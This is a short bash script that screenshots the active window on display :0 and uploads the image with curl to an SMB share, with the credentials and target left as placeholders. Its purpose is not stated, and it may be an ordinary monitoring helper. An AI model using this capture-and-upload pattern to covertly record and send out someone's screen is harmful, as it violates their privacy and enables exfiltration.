#!/bin/bash
DISPLAY=:0 scrot -o -u /root/shot.png
curl --upload-file /root/shot.png -u USERSTRING SMBSTRING
